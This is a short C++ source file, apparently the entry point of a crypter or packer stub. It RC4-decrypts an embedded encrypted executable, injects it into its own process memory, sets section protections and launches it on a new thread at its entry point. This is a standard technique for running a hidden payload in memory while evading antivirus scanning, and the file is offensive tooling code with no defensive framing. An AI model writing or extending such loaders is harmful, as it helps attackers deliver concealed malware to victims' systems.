#include "common.h"
#include "process_injector.h"
#include "ARC4.h"

extern std::string key;

extern uint64_t file_size;

extern uint8_t encrypted_file[];


int main()
{
	ARC4		arc4;
	uint8_t*	dec = (uint8_t*)malloc(file_size * sizeof(uint8_t) + 1);
	
	arc4.setKey((unsigned char*)key.c_str(), key.length());

	arc4.encrypt(encrypted_file, dec, file_size);

	process_injector_t* proc_injector = process_injector_t::get_instance(dec, GetCurrentProcess(), NULL);

	if (!proc_injector->inject_into_process())
		return -1;

	if (!proc_injector->set_sections_protections())
		return -1;
	
	HANDLE thread = proc_injector->create_thread_on_ep();

	if (thread == NULL)
		return -1;

	WaitForSingleObject(thread, -1);

	return 0;
}
